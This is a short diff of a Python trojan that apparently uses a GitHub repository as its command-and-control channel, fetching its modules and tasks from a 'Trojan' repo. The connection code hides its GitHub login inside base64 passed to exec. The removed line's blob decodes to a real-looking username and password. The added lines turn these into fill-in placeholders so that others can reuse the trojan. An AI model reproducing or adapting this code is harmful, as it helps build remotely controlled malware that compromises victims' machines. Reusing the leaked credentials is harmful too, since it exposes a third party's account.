@@ -17,10 +17,11 @@ configured = False
 data_path = "data/%s/" % trojan_id
 trojan_modules = []
 task_queue = Queue.Queue()
+user = ""#your github account name
 
 def connectToGit():
-	exec(base64.b64decode("Z2ggPSBsb2dpbih1c2VybmFtZSA9ICJHSFRIWVMiLCBwYXNzd29yZCA9ICJ6ejEzMzE1NTE2NiIp"))
-	repo = gh.repository("GHTHYS", "Trojan")
+	exec(base64.b64decode(""))#put the base64 coding in ""
+	repo = gh.repository("user", "Trojan")
 	branch = repo.branch("master")
 	return gh, repo, branch
 
